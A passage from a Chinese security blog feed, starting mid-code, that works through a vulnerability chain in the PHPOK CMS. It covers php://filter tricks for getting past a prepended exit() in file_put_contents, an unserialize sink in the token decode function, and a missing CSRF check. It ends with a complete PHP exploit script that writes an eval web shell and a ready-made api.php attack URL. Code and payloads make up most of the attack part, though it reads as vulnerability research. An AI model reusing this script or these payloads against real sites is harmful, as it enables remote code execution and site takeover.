class="string">&#x27;&#x27;</span> || !<span class="keyword">$this</span>-&gt;status)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_time();</span><br><span class="line"><span class="variable">$content</span> = serialize(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;folder.<span class="variable">$id</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;_time();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_count();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;key_list(<span class="variable">$id</span>,<span class="variable">$GLOBALS</span>[<span class="string">&#x27;app&#x27;</span>]-&gt;db-&gt;cache_index(<span class="variable">$id</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="绕过exit"><a href="#绕过exit" class="headerlink" title="绕过exit()"></a>绕过exit()</h3><p>save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行，可以通过php://filter伪协议使拼接的<code>&lt;?php exit();?&gt;</code>失效</p><p>来源于</p><p><a href="https://www.ghtwf01.cn/index.php/archives/981">基于php://filter协议对exit函数几种逃逸方法的分析</a></p><h4 id="1-string-strip-tags"><a href="#1-string-strip-tags" class="headerlink" title="1.string.strip_tags"></a>1.string.strip_tags</h4><p><strong>该特性从PHP 7.3.0起废弃</strong></p><p><code>&lt;?php exit()?&gt;</code>本质是XML标签，可以使用<code>strip_tags()</code>函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将&lt;?php phpinfo();进行base64编码后提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>写入成功</p><p><a href="https://imgbed.cn/preview?id=60208e328053380001383b3f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fb94221b-0076-4065-834a-17976701d407.png" alt="imgbed.cn图床"></a></p><h4 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h4><p>base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>;</code>、<code>(</code>、<code>)</code>等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如<code>&lt;?php exit();?&gt;</code>就会先变成<code>phpexit</code>再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如<code>a</code>，这样就是<code>phpexita</code>再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;aPD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=60208e43002aec00018e1506"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/0689df6f-e7ca-473f-9af4-9f420a2e006e.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/preview?id=60208e3def338d00016bab21"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/46978b5f-e655-40e5-8eb0-bf09082501ad.png" alt="imgbed.cn图床"></a></p><h4 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3.rot13"></a>3.rot13</h4><p><code>&lt;?php exit(); ?&gt;</code>在经过<code>rot13</code>编码后会变成<code>&lt;?cuc rkvg(); ?&gt;</code>，在<code>php</code>不开启<code>short_open_tag</code>时，<code>php</code>不认识这个字符串，也就不会被执行，<code>&lt;?php phpinfo();?&gt;</code>经过rot13编码后的结果为<code>&lt;?cuc cucvasb();?&gt;</code></p><p>提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=60208e4920be4e0001cb1264"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/c46c68fe-cc7e-4815-8fa6-384b74837f82.png" alt="imgbed.cn图床"></a></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token_lib</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line"><span class="keyword">$this</span>-&gt;config();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line"><span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = serialize(<span class="variable">$string</span>);<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line"><span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + <span class="keyword">$this</span>-&gt;time)).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line"><span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line"><span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line"><span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$keyc</span> = substr(<span class="variable">$string</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line"><span class="variable">$string</span> = base64_decode(substr(<span class="variable">$string</span>, <span class="keyword">$this</span>-&gt;keyc_length));</span><br><span class="line"><span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line"><span class="variable">$chkb</span> = substr(md5(substr(<span class="variable">$rs</span>,<span class="number">26</span>).<span class="keyword">$this</span>-&gt;keyb),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span>((substr(<span class="variable">$rs</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="keyword">$this</span>-&gt;time &gt; <span class="number">0</span>) &amp;&amp; substr(<span class="variable">$rs</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="variable">$chkb</span>)&#123;</span><br><span class="line"><span class="variable">$info</span> = substr(<span class="variable">$rs</span>, <span class="number">26</span>);</span><br><span class="line"><span class="keyword">return</span> unserialize(<span class="variable">$info</span>);<span class="comment">//反序列化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;lib(<span class="string">&#x27;token&#x27;</span>)-&gt;keyid(<span class="keyword">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>]);</span><br></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在后台找到API验证串设置处 </p><p><a href="https://imgbed.cn/preview?id=60208e548053380001383ba6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/cbfb37f0-9677-4d21-85ea-a59dc9835fa9.png" alt="imgbed.cn图床"></a></p><p>抓包后发现无csrf防护，构造请求诱导管理员访问即可</p><p><a href="https://imgbed.cn/preview?id=60208e4ee857bd0001015b56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a1149187-1e39-4700-9605-401363ff929c.png" alt="imgbed.cn图床"></a></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>构造脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_id</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_list</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_id = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_list = <span class="string">&#x27;aa&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;folder = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line">        <span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + time())).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">        <span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">        <span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line">        <span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">core</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$cryptkey</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key_length</span> = strlen(<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="variable">$string_length</span> = strlen(<span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$box</span> = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">        <span class="variable">$rndkey</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生密匙簿</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$rndkey</span>[<span class="variable">$i</span>] = ord(<span class="variable">$cryptkey</span>[<span class="variable">$i</span> % <span class="variable">$key_length</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$i</span>] + <span class="variable">$rndkey</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$i</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 核心加解密部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$a</span> = <span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$string_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="variable">$a</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$a</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$a</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$a</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$string</span>[<span class="variable">$i</span>]) ^ (<span class="variable">$box</span>[(<span class="variable">$box</span>[<span class="variable">$a</span>] + <span class="variable">$box</span>[<span class="variable">$j</span>]) % <span class="number">256</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="keyword">new</span> token();</span><br><span class="line"><span class="variable">$token</span>-&gt;keyid(<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>-&gt;encode(serialize(<span class="keyword">new</span> cache));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本得到payload</p><p><a href="https://imgbed.cn/preview?id=60208e5f5dc5370001a46220"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ea1a0588-8774-42f4-9c2a-0fa55ed7e6a0.png" alt="imgbed.cn图床"></a>](<a href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb">https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb</a>)</p><p>在index_cotrol.php中的phpok_f方法中发现调用decode</p><p><a href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/1e6a2d1e-93dd-4606-b9e9-a7172ee26902.png" alt="imgbed.cn图床"></a></p><p>根据路由规则请求url,token为payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;api.php?c&#x3D;index&amp;f&#x3D;phpok&amp;token&#x3D;478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v&#x2F;RfRV&#x2F;CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz&#x2F;vizU53Wfc64OIB&#x2F;5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU&#x2F;Czv0n&#x2F;UXAGlIl+asWwzpz6pMYfHTbIc5Byug4</span><br></pre></td></tr></table></figure><p>利用成功</p><p><a href="https://imgbed.cn/preview?id=60208e6534dcf3000102fb90"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ec806660-0cbe-4b59-959d-bfc31b86d382.png" alt="imgbed.cn图床"></a></p><p>参考：</p><p><a href="https://xz.aliyun.com/t/7852">https://xz.aliyun.com/t/7852</a></p><p><a href="https://www.ghtwf01.cn/index.php/archives/985/">https://www.ghtwf01.cn/index.php/archives/985/</a></p><p><a href="https://www.ghtwf01.cn/index.php/archives/981/">https://www.ghtwf01.cn/index.php/archives/981/</a></p><p><a href="http://althims.com/2020/02/05/phpok-5-4-173/">http://althims.com/2020/02/05/phpok-5-4-173/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows钩子函数</title>
    <link href="/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/"/>
    <url>/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/</url>
    
